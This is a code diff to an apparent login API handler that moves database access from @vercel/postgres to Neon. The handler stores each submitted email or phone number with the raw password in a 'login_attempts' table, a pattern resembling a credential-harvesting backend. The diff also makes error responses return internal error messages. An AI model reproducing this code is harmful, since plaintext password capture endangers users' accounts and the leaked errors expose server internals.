@@ -1,4 +1,5 @@
-import { sql } from "@vercel/postgres";
+// api/login.js
+import { neon } from "@neondatabase/serverless";
 
 export default async function handler(req, res) {
   // Enable CORS
@@ -40,6 +41,9 @@ export default async function handler(req, res) {
       }
     }
 
+    // Connect to database using Neon
+    const sql = neon(process.env.DATABASE_URL);
+
     // Save to database
     await sql`
       INSERT INTO login_attempts (email_or_phone, password, created_at)
@@ -54,7 +58,7 @@ export default async function handler(req, res) {
     console.error("Error:", error);
     return res.status(500).json({
       success: false,
-      message: "Server error occurred",
+      message: "Server error: " + error.message,
     });
   }
 }
